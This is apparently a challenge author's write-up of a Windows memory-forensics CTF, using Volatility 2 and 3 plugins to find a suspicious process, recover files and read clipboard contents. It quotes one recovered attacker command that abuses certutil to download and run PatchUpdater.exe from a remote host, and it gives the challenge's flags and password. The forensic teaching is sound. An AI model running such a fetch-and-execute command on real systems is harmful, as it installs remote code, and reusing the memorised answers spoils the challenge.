---
title: "EYCC - Silent Access DFIR Finals Challenge"
date: 2026-08-20
categories: [challenge-authoring, dfir, ctf]
description: "This one is a Windows Memory Forensics challenge that I intentionally made it easier than the Quals challenge. The main goal was to introduce participants to Volatility 2 & 3 and helping them understand how different plugins can be used to extract useful evidence from a memory dump."
image:
  path: https://cdn-images-1.medium.com/max/1024/1*J3FSVatkytH_ZCsgbxAstw.png
  alt: "EYCC Silent Access DFIR Finals Challenge"
toc: true
---

This one is a Windows Memory Forensics challenge that I intentionally made it easier than the Quals challenge. The main goal was to introduce participants to **Volatility 2 & 3** and helping them understand how different plugins can be used to extract useful evidence from a memory dump.

I highly recommend using this cheat sheet while using volatility to make everything easier and faster → [VOL cheat sheet](https://blog.onfvp.com/post/volatility-cheatsheet/)

I will start with volatility3 which is much easier for usage and more straightforward.

![](https://cdn-images-1.medium.com/max/722/1*YUHZeMcnwBnpY0nJ6V1y_Q.png)

## Q1: What is the PID of the suspicious process observed on the victim’s machine?

Starting by this question we can use the plugins used to see the processes which were active then so by using **windows.pslist** plugin

```text
python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.pslist
```

![](https://cdn-images-1.medium.com/max/1024/1*TCwKWgMrc7KhhF7d29Y6gQ.png)

From there we can see a process named Patchupdater.exe which was opened from cmd.exe and both processes were created at approximately the same time which is a highly suspicious thing .

Answer: **3052**

## Q2: What is the full command typed by the insider to download that malicious executable?

To view the written command we can use **windows.cmdline** plugin

```text
python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.cmdline
```

![](https://cdn-images-1.medium.com/max/1024/1*2i13N91eHlGeJ8CfozVwiQ.png)

Here we can see the written command and got our answer easily You can grep by the **cmd** process ID we found before using grep to narrow the results.

```text
python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.cmdline | grep -i "2968"

2968    cmd.exe "C:\Windows\system32\cmd.exe" /k "cd /d C:\Windows\Temp & certutil -urlcache -f http://192.168.6.133:8888/PatchUpdater.exe PatchUpdater.exe & .\PatchUpdater.exe --server 192.168.6.133 --port 8080"
```

The command first changes the working directory to C:\Windows\Temp, then abuses certutil.exe to download PatchUpdater.exe from 192.168.6.133:8888, and finally executes the downloaded binary.

## Q3: What legitimate Windows utility was abused to download the suspicious executable?

From the previously detected command we already know what the attacker abused which is certutil.exe

- ANSWER: certutil.exe

## Q4: Mahmoud had an important archive that he protected by a special password. This password is left somewhere on his desktop. Can you get this password?

Since the question tells us that the password was left somewhere on the Desktop, we can start by searching for files associated with the user’s Desktop using Volatility 3’s **windows.filescan** plugin:

```text
python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.filescan | grep -i "desktop"
```

![](https://cdn-images-1.medium.com/max/1024/1*J3DZN9wg63GedQhEvdzKXw.png)

It seems that CREDS.txt file contains the password we need so we need to recover it from the memory.

The address shown by windows.filescan comes from Volatility’s scan for _FILE_OBJECT structures in memory.

In this case, we can pass that address to **windows.dumpfiles** using the `--physaddr` option and attempt to reconstruct the cached file content.

![](https://cdn-images-1.medium.com/max/1024/1*wSZNz8Ljytw-c8GwY_NcgQ.png)

So there we got the password which is **0mK3LALAW3LdT** and we can see the archive name too **IMP-Financial Records.7z .**

- ANSWER: **0mK3LALAW3LdT**

## Q5: What is the important data Mahmoud was trying to hide inside that archive?

We already got the archive name so by using the same plugin **windows.filescan** and grepping for the archive name.

![](https://cdn-images-1.medium.com/max/1024/1*1C0BlBlBv6hkUp9-75lkKg.png)

So we should dump that too to see what Mahmoud was trying to hide.

```text
python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem -o ../dumped windows.dumpfiles --physaddr 0x7e1bc070
```

and there we can see our dumped files

![](https://cdn-images-1.medium.com/max/1024/1*aqImkJKTrHV8mNBglSacQA.png)

Volatility produces both .dat and .vacb files depending on how the file was represented in memory.

In our case, we should focus on the **.dat file**, as it represents data recovered from the file’s DataSectionObject, which is the representation we want to inspect for the archive itself.

The .vacb file, on the other hand, comes from the SharedCacheMap and represents data maintained by the Windows Cache Manager.

Since our goal is to recover and inspect the archive, we will continue our analysis using the dumped **.dat file**.

by unzipping the archive using the password we got before we can see the hidden content inside it

![](https://cdn-images-1.medium.com/max/1024/1*Rcl0P-ZlV-RHIC1P5Gzoag.png)

- ANSWER: **EYCC{Y0U_Sh0uLD_M4sTeR_C3RviNG}**

## Final Flag:

![](https://cdn-images-1.medium.com/max/998/1*F9SDlfX2cyXyO6kQ7dJ2zw.png)

I added a question that requires using VOL2 to show them that we need both for analysis:

![](https://cdn-images-1.medium.com/max/869/1*PrGuLu4uMitQ3uD0GGYIMg.png)

First in vol2 we should know the profile of the dump we will analyze to specify it for volatility as by default it uses WinXPSP2x86.

so by using **imageinfo** plugin we can know something like that after that we knew that the copied content will be stored in the clipboard and vol2 got that plugin already which can get us the clipboard content.

![](https://cdn-images-1.medium.com/max/1024/1*zN7-GWONjg7NGmpgtZCRXg.png)

- ANSWER: EYCC{M3me0Ry_F0r3nSicS_M3tteR}

## **Here we go -_- feel free to reach out to me for any clarification.**

……………..

**I hope you enjoyed this write-up and found everything easy to follow.**

**Let me know if you have any feedback!**

………………

{% include toc-image-shift-fix.html %}
